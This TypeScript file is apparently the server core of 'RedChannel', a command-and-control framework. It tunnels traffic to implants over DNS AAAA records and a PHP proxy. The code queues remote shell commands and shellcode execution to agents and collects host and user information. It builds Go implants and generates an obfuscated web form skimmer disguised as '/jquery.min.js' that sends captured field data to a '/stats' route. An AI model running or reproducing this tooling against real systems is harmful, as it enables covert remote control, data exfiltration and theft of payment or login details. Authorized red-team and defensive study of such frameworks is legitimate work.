import * as fs from "fs";
import * as jsObfuscator from "javascript-obfuscator";
import axios from "axios";
import * as crypto from "crypto";
import * as os from "os";
import * as path from "path";
import merge from "lodash.merge";
import ECKey from "ec-key";
import { spawn, ChildProcessWithoutNullStreams } from "child_process";

import { Config, Constants, emsg } from "../utils/utils";
import Crypto, { CipherModel } from "./crypto";
import Logger from "./logger";
import Helper from "./helper";

export enum AgentCommand {
    AGENT_SYSINFO = 0x01,
    AGENT_CHECKIN = 0x02,
    AGENT_SHELL = 0x03,
    AGENT_MSG = 0x04,
    AGENT_EXEC_SC = 0x05,
    AGENT_SHUTDOWN = 0x06,
    AGENT_KEYX = 0x07,
    AGENT_SET_CONFIG = 0x08,
    AGENT_IGNORE = 0xff,
}

export type C2Config = {
    domain: string;
    dns_ip: string;
    dns_port: number;
    web_ip: string;
    web_port: number;
    interval: number;
    plaintext_password: string;
    binary_route: string;
    web_url: string;
};
export type SkimmerConfig = {
    payload_route: string;
    data_route: string;
    url: string;
    target_classes: string[];
    target_ids: string[];
};
export type ProxyConfig = {
    enabled: boolean;
    url: string;
    key: string;
    interval: number;
};

export type ImplantConfig = {
    os: string;
    arch: string;
    resolver: string;
    interval: number;
    output_file: string;
    debug: boolean;
};

export type RedChannelConfig = {
    c2: C2Config;
    skimmer: SkimmerConfig;
    proxy: ProxyConfig;
    implant: ImplantConfig;
    static_dns: { [host: string]: string };
    debug: boolean;
};

export interface AgentModel {
    id: string;
    secret?: Buffer;
    keyx?: ECKey;
    lastseen?: number;
    ip?: string;
    channel?: AgentChannel;
    allow_keyx?: boolean;
    sendq: Array<string[]>;
    // each agent command has a map of dataId => {chunks, data}
    recvq: Map<AgentCommand, Map<string, string[]>>;
}

// agent status hex string value to be appended to DNS response
export enum AgentStatus {
    MORE_DATA = "01",
    DATA_RECEIVED = "02",
    NO_DATA = "03",
    ERROR_IMPORTING_KEY = "04",
    ERROR_DERIVING_SECRET = "05",
    ERROR_DECRYPTING_MESSAGE = "06",
    ERROR_GENERATING_KEYS = "07",
    ERROR_INVALID_MESSAGE = "08",
}

export enum AgentChannel {
    DNS = "dns",
    PROXY = "proxy",
}

class RedChannel {
    version = Constants.VERSION;

    agents: { [agentId: string]: AgentModel };
    flood: Map<string, NodeJS.Timeout>;

    /**
     * available commands for 'help' to display
     *
     * agent commands are available while interacting with an agent
     * c2 commands are available in the main menu
     */
    commands: any;

    /**
     * holds the agent object we are currently interacting with
     */
    interact: AgentModel | null;

    /**
     * module actions
     *
     * function will be executed when the command is typed
     */
    modules: any;

    master_password: string;

    // name of module currently interacting with
    using_module: string;

    config_file: string;

    config: RedChannelConfig;

    // the absolute path to the app directory
    app_root: string = path.resolve("./");

    log: Logger;

    crypto: Crypto;

    constructor(debug: boolean, domain: string, config: any, password: string, configFile?: string) {
        this.log = new Logger();

        this.agents = {};
        this.commands = { ...Helper.Commands() };

        this.modules = {
            proxy: {
                fetch_timer: {}, // stores the loop Timeout ref
                actions: {
                    generate: this.proxy_generate,
                    fetch: this.proxy_fetch,
                    "set enabled": this.proxy_enable,
                },
            },
            skimmer: {
                payload: "", // generated, payload to serve via payload_route,
                actions: {
                    generate: this.skimmer_generate,
                },
            },
            static_dns: {
                actions: {
                    add: this.static_dns_add,
                    delete: this.static_dns_delete,
                },
            },
            implant: {
                actions: {
                    generate: this.implant_build,
                    build: this.implant_build,
                    log: this.implant_log,
                },
            },
        };

        this.using_module = "";

        this.config_file = configFile ?? Config.DEFAULT_CONFIG_FILE;

        // merged with data from config file
        this.config = {
            c2: {
                domain: domain ?? "",
                dns_ip: "127.0.0.1",
                dns_port: 53,
                web_ip: "127.0.0.1",
                web_port: 4321,
                interval: 5000,
                plaintext_password: "",
                binary_route: "/agent",
                web_url: "",
            },
            skimmer: {
                payload_route: "/jquery.min.js",
                data_route: "/stats",
                url: "",
                target_classes: [],
                target_ids: [],
            },
            proxy: {
                enabled: false,
                url: "",
                key: "",
                interval: 2000,
            },
            implant: {
                os: "windows",
                arch: "amd64",
                interval: 5000,
                resolver: "8.8.8.8:53",
                output_file: "",
                debug: false,
            },
            static_dns: {},
            debug: debug,
        };

        this.config.c2.plaintext_password = password;
        this.master_password = crypto.createHash("md5").update(password).digest("hex");

        // read config file and merge with defaults to ensure properties exist
        try {
            const configData = JSON.parse(fs.readFileSync(this.config_file).toString());
            this.config = merge(this.config, merge(configData, config));
        } catch (ex) {
            throw new Error(`Error reading configuration file '${this.config_file}': ${emsg(ex)}`);
        }

        if (!this.config.c2.domain) {
            throw new Error(`Please specify the c2 domain via cli or config file, see '--help'`);
        }

        this.app_root = __dirname;

        this.crypto = new Crypto();

        this.interact = null;
        this.flood = new Map<string, NodeJS.Timeout>();

        if (this.config.proxy.enabled) {
            this.log.info(`starting proxy checkin at interval: ${this.config.proxy.interval}ms`);
            this.proxy_fetch_loop();
        }
    }

    init_agent(agent_id, channel: AgentChannel) {
        if (typeof this.agents[agent_id] == "undefined") {
            this.agents[agent_id] = {
                id: agent_id,
                lastseen: 0,
                channel: channel,
                allow_keyx: false,
                sendq: [],
                recvq: new Map<AgentCommand, Map<string, string[]>>(),
            };
        }
    }

    kill_agent(agent_id) {
        delete this.agents[agent_id];
    }

    command_keyx(agent_id?: string) {
        if (!this.crypto.privateKey) {
            this.crypto.generate_keys();
        }

        const uncompressedPublicKey = this.crypto.export_pubkey("uncompressed");
        if (!agent_id) {
            // broadcast keyx if no agent is specified
            Object.keys(this.agents).forEach((id) => {
                this.queue_data(id, AgentCommand.AGENT_KEYX, uncompressedPublicKey);
            });
            return;
        }

        if (typeof this.agents[agent_id] != "undefined") {
            this.queue_data(agent_id, AgentCommand.AGENT_KEYX, uncompressedPublicKey);
        }
        return;
    }

    command_shutdown() {
        if (!this.interact) return;

        this.queue_data(this.interact.id, AgentCommand.AGENT_SHUTDOWN, this.encryptPayload(crypto.randomBytes(6).toString("hex")));
    }

    command_shell(shell_cmd) {
        if (!this.interact) return;

        this.queue_data(this.interact.id, AgentCommand.AGENT_SHELL, shell_cmd);
    }

    command_exec_sc(shellcode) {
        if (!this.interact) return;

        this.queue_data(this.interact.id, AgentCommand.AGENT_EXEC_SC, shellcode);
    }

    // agent must be able to decrypt the tag to execute shutdown
    command_sysinfo() {
        if (!this.interact) return;

        this.queue_data(this.interact.id, AgentCommand.AGENT_SYSINFO, this.encryptPayload(crypto.randomBytes(6).toString("hex")));
    }
    /**
     * config format:
     *
     * interval=5000
     * c2_domain=domain1[,domain2?]
     */
    command_set_config(config: string) {
        if (!this.interact) return;

        this.queue_data(this.interact.id, AgentCommand.AGENT_SET_CONFIG, config);
    }

    encryptPayload(data: string): string {
        if (!this.interact) return "";

        const buffer = Buffer.from(data);
        const cipher = this.crypto.aes_encrypt(buffer, this.interact.secret);
        const payload = this.make_encrypted_buffer_string(cipher);
        return payload;
    }
    /**
     * queue up data to send when agent checks in next
     * 2001:[record_num]:[4 byte data]:...
     *
     * first IP in each command must be the data identifier for agent to track
     * ff00:[data_id]:[command][padded_bytes_count]:[total_records]:[4 byte reserved data]:...
     *
     */
    queue_data(agentId, command, data) {
        const agent = this.agents[agentId];

        let dataPayload = this.encryptPayload(data);
        if (dataPayload.length == 0) dataPayload = crypto.randomBytes(2).toString("hex");

        const dataBlocks = dataPayload.match(/[a-f0-9]{1,4}/g);
        if (!dataBlocks) return;

        // prettier-ignore
        const totalRecords =
            Math.floor(dataBlocks.length / Config.MAX_DATA_BLOCKS_PER_IP) +
            (dataBlocks.length % Config.MAX_DATA_BLOCKS_PER_IP == 0 ? 0 : 1);

        // prettier-ignore
        const totalCommands =
            Math.floor(totalRecords / Config.MAX_RECORDS_PER_COMMAND) +
            (totalRecords % Config.MAX_RECORDS_PER_COMMAND == 0 ? 0 : 1);

        const dataId = crypto.randomBytes(2).toString("hex");

        let records: string[] = [];
        let paddedBytes = 0;
        let record = "";
        for (let recordNum = 0; recordNum < totalRecords; recordNum++) {
            const blocksPerIp = dataBlocks.splice(0, Config.MAX_DATA_BLOCKS_PER_IP);

            // pad the last block with trailing Fs
            const lastAddedBlock = blocksPerIp.slice(-1)[0];
            paddedBytes = 4 - lastAddedBlock.length;
            blocksPerIp[blocksPerIp.length - 1] = this.pad_tail(lastAddedBlock, 4);
            if (blocksPerIp.length < Config.MAX_DATA_BLOCKS_PER_IP) {
                const blocksNeeded = Config.MAX_DATA_BLOCKS_PER_IP - blocksPerIp.length;
                for (let j = 0; j < blocksNeeded; j++) {
                    blocksPerIp.push(Config.DATA_PAD_CHAR.repeat(4));
                    paddedBytes += 4;
                }
            }
            if (paddedBytes > 0) {
                paddedBytes = paddedBytes / 2; // agent assumes bytes not hex strings
            }

            // prettier-ignore
            record =
            Config.RECORD_DATA_PREFIX +
                ":" +
                this.pad_zero(recordNum.toString(16), 4) +
                ":" +
                blocksPerIp.join(":");
            records.push(record);

            if (totalCommands > 1 && (records.length == Config.MAX_RECORDS_PER_COMMAND - 1 || recordNum == totalRecords - 1)) {
                // prettier-ignore
                record =
                Config.RECORD_HEADER_PREFIX +
                    ":" +
                    dataId +
                    ":" +
                    this.pad_zero(command.toString(16), 2) +
                    this.pad_zero(paddedBytes.toString(16), 2) +
                    ":" +
                    this.pad_zero(totalRecords.toString(16), 4) +
                    ":" +
                    "0000:0000:0000:0001";

                records.unshift(record);

                agent.sendq.push(records);
                records = [];
            }
        }
        if (totalCommands == 1) {
            // prettier-ignore
            record =
            Config.RECORD_HEADER_PREFIX +
                ":" +
                dataId +
                ":" +
                this.pad_zero(command.toString(16), 2) +
                this.pad_zero(paddedBytes.toString(16), 2) +
                ":" +
                this.pad_zero(totalRecords.toString(16), 4) +
                ":" +
                "0000:0000:0000:0001";
            records.unshift(record);
        }

        // set to false after keyx is received and there are no more keyx in sendq
        if (command == AgentCommand.AGENT_KEYX) agent.allow_keyx = true;

        if (records.length > 0) {
            agent.sendq?.push(records);
            if (this.config.proxy.enabled && agent.channel == AgentChannel.PROXY) {
                this.send_to_proxy(agent.id, records);

                // cleanup sendq if proxying to agent
                agent.sendq = [];
            }
        }
        //console.log("* queued up " + total_records + " records in " + total_commands + " command(s) for agent: " + agent_id);
        //console.log("`- records: " + JSON.stringify(records));
    }

    async send_to_proxy(agentId: string, records: string[]) {
        const recordsString = `${records.join(";")};`;

        // console.log("* sending data to proxy: " + str_data);
        const data = {
            d: recordsString,
            k: this.config.proxy.key,
            i: agentId,
            p: "c",
        };

        try {
            const res = await axios.post(this.config.proxy.url, data);
            this.log.debug(`proxy send response: ${res.data}`);
        } catch (ex) {
            this.log.error(`failed to send data to proxy: ${emsg(ex)}`);
        }
        return;
    }

    async get_from_proxy() {
        if (!this.config.proxy.enabled) return;
        if (this.config.proxy?.url || this.config.proxy?.key) return;

        const data = {
            url: this.config.proxy.url,
            form: {
                k: this.config.proxy.key,
                f: "a",
            },
        };

        return axios
            .post(this.config.proxy.url, data)
            .then((result) => this.process_proxy_data(result.data))
            .catch((ex) => {
                this.log.error(`proxy fetch failed: ${emsg(ex)}`);
            });
    }

    process_proxy_data(proxyData: string) {
        // we expect the proxy to respond with ERR 1, or similar
        // this.this.log.debug(`proxy response:\n${proxyData}`);
        if (proxyData.length <= 5) throw new Error(`unexpected response (too small)`);
        if (!Constants.VALID_PROXY_DATA.test(proxyData)) throw new Error(`invalid incoming proxy data`);

        // grab proxy response and build mock dns queries
        let data = proxyData.replace(/;$/, "").split(";");
        data.forEach((q) => {
            let req = {
                connection: {
                    remoteAddress: this.config.proxy.url,
                    type: "PROXY",
                },
            };
            let res = {
                question: [
                    {
                        type: "PROXY",
                        name: `${q}.${this.config.c2.domain}`,
                    },
                ],
                answer: [],
                end: () => {},
            };
            this.c2MessageHandler(req, res);
        });
    }

    pad_zero(proxyData, max_len) {
        return "0".repeat(max_len - proxyData.length) + proxyData;
    }
    pad_tail(proxyData, max_len) {
        return proxyData + Config.DATA_PAD_CHAR.repeat(max_len - proxyData.length);
    }

    is_command_in_sendq(agent_id, command) {
        var is = false;
        var cmd = this.pad_zero(command.toString(16), 2);

        this.agents[agent_id].sendq?.forEach((q) => {
            if (q[0].substring(0, 4) == Config.RECORD_HEADER_PREFIX) {
                if (q[0].substring(12, 14) == cmd) {
                    is = true;
                    return;
                }
            }
        });
        return is;
    }

    make_ip_string(last_byte) {
        return `${Config.RECORD_HEADER_PREFIX}:0000:${AgentCommand.AGENT_IGNORE.toString(16)}01:0000:0000:dead:c0de:00${last_byte}`;
    }

    /**
     * Make a string the cipher data and iv
     * @param {CipherModel} cipher A cipher object with IV and Data
     * @returns a hex string
     */
    make_encrypted_buffer_string(cipher: CipherModel) {
        return Buffer.concat([cipher.iv, cipher.data]).toString("hex");
    }

    count_data_chunks(chunks_array: string[]) {
        return chunks_array.filter((a) => a !== undefined).length;
    }

    /**
     * return an array of agent idents with an optional
     * prepended text to each ident (for tab completion)
     */
    get_all_agents(prepend = "") {
        const agents: string[] = [];
        Object.keys(this.agents).forEach((a) => {
            agents.push(prepend + this.agents[a].id);
        });
        return agents;
    }

    get_agent(agentId): AgentModel | null {
        for (const id in this.agents) {
            if (id == agentId) return this.agents[id];
        }
        return null;
    }

    /**
     * skimmer generate action
     */
    skimmer_generate() {
        if (this.config.skimmer.url.length == 0) throw new Error(`skimmer url is required, see 'help'`);

        let data: Buffer;
        let skimmerJs = "";
        try {
            data = fs.readFileSync("payloads/skimmer.js");
            skimmerJs = data.toString();
        } catch (ex) {
            throw new Error(`failed to generate payload: ${emsg(ex)}`);
        }

        const targetClasses = "['" + this.config.skimmer.target_classes.join("','") + "']";
        const targetIds = "['" + this.config.skimmer.target_ids.join("','") + "']";
        const targetUrl = this.config.skimmer.url;
        const targetDataRoute = this.config.skimmer.data_route;

        skimmerJs = skimmerJs.replace(/\[SKIMMER_URL\]/, targetUrl);
        skimmerJs = skimmerJs.replace(/\[SKIMMER_DATA_ROUTE\]/, targetDataRoute);
        skimmerJs = skimmerJs.replace(/\[SKIMMER_CLASSES\]/, targetClasses);
        skimmerJs = skimmerJs.replace(/\[SKIMMER_IDS\]/, targetIds);
        skimmerJs = skimmerJs.replace(/\s+console\.log\(.+;/g, "");

        let obfs: jsObfuscator.ObfuscationResult;
        try {
            obfs = jsObfuscator.obfuscate(skimmerJs, {
                compact: true,
                controlFlowFlattening: true,
                transformObjectKeys: true,
                log: false,
                renameGlobals: true,
                stringArray: true,
                stringArrayEncoding: ["rc4"],
                identifierNamesGenerator: "mangled",
            });
            this.modules.skimmer.payload = obfs.getObfuscatedCode();
        } catch (ex) {
            throw new Error(`failed to obfuscate js payload: ${emsg(ex)}`);
        }

        return { message: `skimmer payload set to: \n${this.modules.skimmer.payload}` };
    }

    /**
     * proxy generate action
     */
    proxy_generate() {
        if (!this.config.proxy.key) throw new Error(`proxy key is required, see 'help'`);

        let data: Buffer;
        let proxyPhp = "";
        try {
            data = fs.readFileSync("payloads/proxy.php");
            proxyPhp = data.toString();
        } catch (ex) {
            throw new Error(`failed to generate payload: ${emsg(ex)}`);
        }

        proxyPhp = proxyPhp.replace(/\[PROXY_KEY\]/, this.config.proxy.key);
        proxyPhp = proxyPhp.replace(/\/\/.+/g, "");
        proxyPhp = proxyPhp.replace(/<\?php/g, "");
        proxyPhp = proxyPhp.replace(/\?>/g, "");
        proxyPhp = proxyPhp.replace(/\n/g, "");
        proxyPhp = proxyPhp.replace(/\s{2,}/g, "");

        this.modules.proxy.payload = `<?php ${proxyPhp} ?>`;
        return { message: `proxy payload set: \n${this.modules.proxy.payload}` };
    }
    proxy_fetch() {
        this.get_from_proxy();
        return { message: "fetching data from proxy..." };
    }

    proxy_enable() {
        let message = this.config.proxy.enabled ? `starting proxy checkin at interval: ${this.config.proxy.interval}ms` : `stopping proxy checkin`;

        this.proxy_fetch_loop();
        return { message: message, error: false };
    }

    /**
     * Proxy loop
     */
    proxy_fetch_loop() {
        if (this.modules.proxy.fetch_timer) clearTimeout(this.modules.proxy.fetch_timer);
        if (!this.config.proxy.enabled) return;

        this.get_from_proxy().finally(() => {
            this.modules.proxy.fetch_timer = setTimeout(() => {
                this.proxy_fetch_loop();
            }, this.config.proxy.interval);
        });
    }

    static_dns_add(params) {
        if (params.length < 2) throw new Error(`please enter a host and ip, see 'help'"`);

        let host = params[0];
        let ip = params[1];

        if (!Constants.VALID_HOST_REGEX.test(host)) throw new Error(`invalid host value, see 'help'`);
        if (!Constants.VALID_IP_REGEX.test(ip)) throw new Error(`invalid ip value, see 'help'`);

        this.config.static_dns[host] = ip;
        return { message: `added static dns record ${host} = ${ip}` };
    }

    static_dns_delete(params) {
        if (params.length == 0) throw new Error(`please enter a host, see 'help'"`);

        const host = params[0];
        if (!Constants.VALID_HOST_REGEX.test(host)) throw new Error(`invalid host value, see 'help'`);

        delete this.config.static_dns[host];
        return { message: `deleted static dns record ${host}` };
    }

    implant_build_gen_config() {
        let data: Buffer;
        let configData = "";
        let agentConfigPath = `${this.app_root}/agent/config/config.go`;
        try {
            data = fs.readFileSync(`${agentConfigPath}.sample`);
            configData = data.toString();
        } catch (ex) {
            throw new Error(`failed to read agent config file template '${agentConfigPath}.sample': ${emsg(ex)}`);
        }

        configData = configData.replace(/^\s*c\.C2Domain\s*=\s*\".*\".*$/im, `c.C2Domain = "${this.config.c2.domain}"`);
        configData = configData.replace(/^\s*c\.C2Password\s*=\s*\".*\".*$/im, `c.C2Password = "${this.config.c2.plaintext_password}"`);
        configData = configData.replace(/^\s*c\.Resolver\s*=\s*\".*\".*$/im, `c.Resolver = "${this.config.implant.resolver}"`);
        configData = configData.replace(/^\s*c\.C2Interval\s*=.*$/im, `c.C2Interval = ${this.config.implant.interval}`);
        configData = configData.replace(/^\s*c\.ProxyEnabled\s*=.*$/im, `c.ProxyEnabled = ${this.config.proxy.enabled}`);
        configData = configData.replace(/^\s*c\.ProxyUrl\s*=\s*\".*\".*$/im, `c.ProxyUrl = "${this.config.proxy.url}"`);
        configData = configData.replace(/^\s*c\.ProxyKey\s*=\s*\".*\".*$/im, `c.ProxyKey = "${this.config.proxy.key}"`);

        try {
            fs.writeFileSync(agentConfigPath, configData, { flag: "w" });
        } catch (ex) {
            throw new Error(`failed to write agent config file '${agentConfigPath}': ${emsg(ex)}`);
        }
        return { message: `agent config file written to: ${agentConfigPath}` };
    }

    implant_build(params) {
        const targetOs = params[0] ?? this.config.implant.os;
        const targetArch = params[1] ?? this.config.implant.arch;
        const debug = this.config.implant.debug;

        if (!Constants.VALID_BUILD_TARGET_OS.test(targetOs)) throw new Error(`invalid os value, must be supported by Go (GOOS)`);
        if (!Constants.VALID_BUILD_TARGET_ARCH.test(targetArch)) throw new Error(`invalid arch value, must be supported by Go (GOARCH)`);

        try {
            this.implant_build_gen_config();
        } catch (ex) {
            throw new Error(`error generating build config: ${emsg(ex)}`);
        }

        const buildPath = `${this.app_root}/agent`;
        const outputFile = `${buildPath}/build/agent${targetOs === "windows" ? ".exe" : ""}`;

        // prettier-ignore
        const commandArguments = [
            `${buildPath}/tools/build.py`,
            `${buildPath}`,
            `${outputFile}`,
            targetOs,
            targetArch,
            debug && "debug",
        ];
        const goEnvironment = {
            GOOS: targetOs,
            GOARCH: targetArch,
            GO111MODULE: "auto",
            GOCACHE: path.join(os.tmpdir(), "rc-build-cache"), // 'go cache clean' after build?
            GOPATH: path.join(os.tmpdir(), "rc-build-path"),
            PATH: process.env.PATH,
        };

        const spawnBinary = "python";
        let childProcess: ChildProcessWithoutNullStreams;
        try {
            // TODO: do this with docker instead? https://hub.docker.com/_/golang
            childProcess = spawn(spawnBinary, commandArguments, {
                env: goEnvironment,
                cwd: buildPath /*, windowsVerbatimArguments: true*/,
            });
            childProcess.on("close", (code) => {
                // send this message to the UI somehow
                this.log.success(`agent build for os: ${targetOs}, arch: ${targetArch}, debug: ${debug ? "true" : "false"}, return code: ${code}`);
            });
        } catch (ex) {
            return { message: `failed to launch build command: '${emsg(ex)}', build command: '${spawnBinary} ${commandArguments.join(" ")}'`, error: true };
        }

        try {
            const logStream = fs.createWriteStream(`${this.app_root}/agent/build/build.log`, { flags: "w" });
            childProcess.stdout.pipe(logStream);
            childProcess.stderr.pipe(logStream);
        } catch (ex) {
            throw new Error(`failed to write log file: ${emsg(ex)}`);
        }

        this.config.implant.output_file = outputFile;

        const binaryUrl = this.config.c2.web_url + this.config.c2.binary_route;

        return {
            message: `building ${debug ? "(debug)" : ""} agent for os: ${targetOs}, arch: ${targetArch}, binary will be available here: ${outputFile} and ${binaryUrl}`,
        };
    }
    implant_log() {
        var log_path = `${this.app_root}/agent/build/build.log`;
        var log_data = "";
        try {
            log_data = fs.readFileSync(log_path).toString();
        } catch (ex) {
            return { message: `error: failed to read build log file: ${emsg(ex)}`, error: true };
        }

        return { message: log_data, error: false };
    }

    /**
     req: {
         connection: {
             remoteAddress: '127.0.0.1',
            type: 'AAAA'
        }
    }
    res: {
        question[0]: {
            type: 'AAAA',
            name: 'dns.query.tld'
        },
        answer: [],
        end: function(){}
    }
    */
    c2MessageHandler(req, res) {
        var question = res.question[0];
        var hostname = question.name as string;
        var ttl = 300; // Math.floor(Math.random() 3600)
        let channel = question.type === "PROXY" ? AgentChannel.PROXY : AgentChannel.DNS;

        if (this.config.static_dns[hostname]) {
            this.log.info(`static_dns: responding to request for host: '${hostname}' with ip '${this.config.static_dns[hostname]}'`);
            res.answer.push({
                name: hostname,
                type: "A",
                data: this.config.static_dns[hostname],
                ttl: ttl,
            });
            return res.end();
        }

        if (!hostname.endsWith(this.config.c2.domain)) {
            this.log.debug(`unknown c2 domain, ignoring query for: ${hostname}`);
            return res.end();
        }
        this.log.debug(`query: ${req.connection.remoteAddress}:${req.connection.type} ${question.type} ${question.name}`);

        if (question.type !== "AAAA" && question.type !== "PROXY") {
            this.log.debug(`ignoring non-AAAA/non-PROXY query ${req.connection.remoteAddress}:${req.connection.type} ${question.type} ${question.name}`);
            return res.end();
        }

        const segments = hostname.slice(0, hostname.length - this.config.c2.domain.length).split(".");
        if (segments.length < Config.EXPECTED_DATA_SEGMENTS) {
            this.log.error(`invalid message, not enough data segments (${segments.length}, expected ${Config.EXPECTED_DATA_SEGMENTS}): ${hostname}`);

            return res.end();
        }

        // used to prevent flooding
        const randId: string = segments[0];
        const agentId: string = segments[1];
        const floodId = agentId + randId;
        if (!this.agents[agentId]) {
            this.init_agent(agentId, channel);
            this.log.warn(`first ping from agent ${agentId}, src: ${req.connection.remoteAddress}, channel: ${this.agents[agentId].channel}`);

            if (!this.crypto.privateKey) this.crypto.generate_keys();

            this.log.warn(`keyx started with agent ${agentId}`);
            this.command_keyx(agentId);
        }
        this.agents[agentId].lastseen = Math.floor(Date.now() / 1000);
        this.agents[agentId].ip = req.connection.remoteAddress;

        let command = 0;
        try {
            command = parseInt(segments[2].slice(0, 2), 16);
        } catch (ex) {
            this.log.error(`failed to parse command: ${emsg(ex)}`);

            return res.end();
        }

        // no need to check the incoming data, just send a queued up msg
        if (command == AgentCommand.AGENT_CHECKIN) {
            if (channel !== this.agents[agentId].channel) {
                this.log.warn(`agent ${agentId} switching channel from ${this.agents[agentId].channel} to ${channel}`);
                this.agents[agentId].channel = channel;
            }

            if (this.agents[agentId].sendq?.length == 0) {
                // 03 means no data to send
                this.log.debug(`agent ${agentId} checking in, no data to send`);
                const noDataStatus = this.make_ip_string(AgentStatus.NO_DATA);
                res.answer.push({
                    name: hostname,
                    type: "AAAA",
                    data: noDataStatus,
                    ttl: ttl,
                });

                return res.end();
            }

            // we have already responded to this agent and rand_id combination
            // reset the flood protection timeout
            if (this.flood.has(floodId)) {
                clearTimeout(this.flood[floodId]);
                this.flood.set(
                    floodId,
                    setTimeout(() => {
                        this.flood.delete(floodId);
                    }, Config.FLOOD_PROTECTION_TIMEOUT_MS)
                );

                this.log.warn(`ignoring flood from agent: ${agentId}, rid: ${randId}, command: ${command}`);
                return res.end();
            }

            this.log.debug(`agent ${agentId} checking in, sending next queued command`);
            const records = this.agents[agentId].sendq.shift();
            if (records) {
                records.forEach((record) => {
                    res.answer.push({
                        name: hostname,
                        type: "AAAA",
                        data: record,
                        ttl: ttl,
                    });
                });
            }

            // flood protection, if the agent dns resolver retries a query, data can be lost
            // so we ignore retries
            this.flood.set(
                floodId,
                setTimeout(() => {
                    this.flood.delete(floodId);
                }, Config.FLOOD_PROTECTION_TIMEOUT_MS)
            );

            return res.end();
        }

        let currentChunk = 0;
        let totalChunks = 0;
        try {
            currentChunk = parseInt(segments[2].slice(2, 4), 16);
            totalChunks = parseInt(segments[2].slice(4, 6), 16);
        } catch (ex) {
            return this.log.error(`message: invalid chunk numbers, current: ${currentChunk}, total: ${totalChunks}`);
        }

        const dataId: string = segments[3];
        if (dataId.length < 2) return this.log.error(`message: invalid data id: ${dataId}`);

        const chunk: string = segments[4];
        if (chunk.length < 2) return this.log.error(`message: invalid chunk: ${chunk}`);

        if (!this.agents[agentId].recvq.has(command)) {
            this.agents[agentId].recvq.set(command, new Map<string, string[]>());
        }

        // we use ! to tell typescript we are smarter than it
        const recvqCommand = this.agents[agentId].recvq.get(command)!;
        if (!recvqCommand.get(dataId)) {
            recvqCommand.set(dataId, new Array(totalChunks));
        }

        const recvqDataId = recvqCommand.get(dataId)!;

        recvqDataId[currentChunk] = chunk;
        recvqCommand.set(dataId, recvqDataId);
        // count non undefined data array entries
        // since data is not sent in sequence, array may be [undefined, undefined, 123, undefined, 321]
        if (this.count_data_chunks(recvqDataId) == totalChunks) {
            const dataChunks = recvqDataId.join("");
            recvqCommand.delete(dataId);

            // process data, send back status (0f = failed, 02 = success)
            const processStatus = this.process_dns_data(agentId, command, dataChunks);
            if (processStatus) {
                res.answer.push({
                    name: hostname,
                    type: "AAAA",
                    data: this.make_ip_string(processStatus),
                    ttl: ttl,
                });
            }

            return res.end();
        }

        // last byte 01 indicates more data is expected
        const moreData = this.make_ip_string("01");
        res.answer.push({
            name: hostname,
            type: "AAAA",
            data: moreData,
            ttl: ttl,
        });

        /*if (question.type == 'CNAME') {
        res.answer.push({ name: hostname, type: 'CNAME', data: "x.domain.tld", 'ttl': ttl })
        }
        if (question.type == 'A') {
            res.answer.push({ name: hostname, type: 'A', data: "1.1.1." + length, 'ttl': ttl })
        }*/
        return res.end();
    }

    process_dns_data(agentId, command, data): AgentStatus {
        let plaintext = "";
        switch (command) {
            case AgentCommand.AGENT_KEYX:
                if (!this.agents[agentId].allow_keyx) {
                    this.log.error(`incoming keyx from ${agentId} not allowed, initiate keyx first`);
                    break;
                }

                if (!this.crypto.privateKey) {
                    try {
                        this.crypto.generate_keys();
                    } catch (ex) {
                        this.log.error(`failed to generate keys: ${emsg(ex)}`);
                        return AgentStatus.ERROR_GENERATING_KEYS;
                    }
                }

                const agentPubkey = Buffer.from(data, "hex");
                try {
                    this.agents[agentId].keyx = this.crypto.import_uncompressed_pubkey(agentPubkey);
                } catch (ex) {
                    this.log.error(`cannot import key for ${agentId}: ${emsg(ex)}`);
                    return AgentStatus.ERROR_IMPORTING_KEY;
                }
                this.log.success(`agent(${agentId}) keyx: ${this.agents[agentId].keyx.asPublicECKey().toString("spki")}`);

                try {
                    this.agents[agentId].secret = this.crypto.derive_secret(this.agents[agentId].keyx, this.master_password);
                } catch (ex) {
                    this.log.error(`cannot derive secret for ${agentId}: ${emsg(ex)}`);
                    return AgentStatus.ERROR_DERIVING_SECRET;
                }
                this.log.success(`agent(${agentId}) secret: ${this.agents[agentId].secret?.toString("hex")}`);

                // if there are no more queued up keyx's, ignore further keyxs from agent
                if (!this.is_command_in_sendq(agentId, AgentCommand.AGENT_KEYX)) this.agents[agentId].allow_keyx = false;
                break;
            case AgentCommand.AGENT_MSG:
                try {
                    plaintext = this.decrypt_dns_message(agentId, data);
                } catch (ex) {
                    this.log.error(`cannot decrypt message from ${agentId}: ${emsg(ex)}`);
                    return AgentStatus.ERROR_DECRYPTING_MESSAGE;
                }
                this.log.success(`agent(${agentId}) output>\n ${plaintext}`);
                break;
            case AgentCommand.AGENT_SYSINFO:
                plaintext = "";
                try {
                    plaintext = this.decrypt_dns_message(agentId, data);
                } catch (ex) {
                    this.log.error(`cannot decrypt message from ${agentId}: ${emsg(ex)}`);
                    return AgentStatus.ERROR_DECRYPTING_MESSAGE;
                }

                const sysInfo = plaintext.split(";");
                if (sysInfo.length < 3) {
                    this.log.error(`invalid sysinfo from ${agentId}: ${plaintext}`);
                    return AgentStatus.ERROR_INVALID_MESSAGE;
                }

                const userInfo = sysInfo[2].split(":");
                if (userInfo.length < 3) {
                    this.log.error(`invalid sysinfo:userinfo from ${agentId}: ${plaintext}`);
                    return AgentStatus.ERROR_INVALID_MESSAGE;
                }
                const displayRows = [
                    ["hostname", sysInfo[0]],
                    ["ips", sysInfo[1]],
                    ["user", userInfo[0]],
                    ["uid", userInfo[1]],
                    ["gid", userInfo[2]],
                ];

                this.log.success(`agent(${agentId}) sysinfo>`);
                this.log.display_table([], displayRows);
                break;
        }
        return AgentStatus.DATA_RECEIVED;
    }

    decrypt_dns_message(agentId, data) {
        if (!agentId) throw new Error("invalid agent id");
        if (!data) throw new Error("invalid data");
        if (!this.agents[agentId].keyx) throw new Error("missing keyx");

        const buffer = Buffer.from(data, "hex");
        const iv = buffer.slice(0, this.crypto.BLOCK_LENGTH);
        const ciphertext = buffer.slice(this.crypto.BLOCK_LENGTH);

        // may throw errors
        const plaintext = this.crypto.aes_decrypt(ciphertext, this.agents[agentId].secret, iv);
        return plaintext.toString();
    }
}

export default RedChannel;
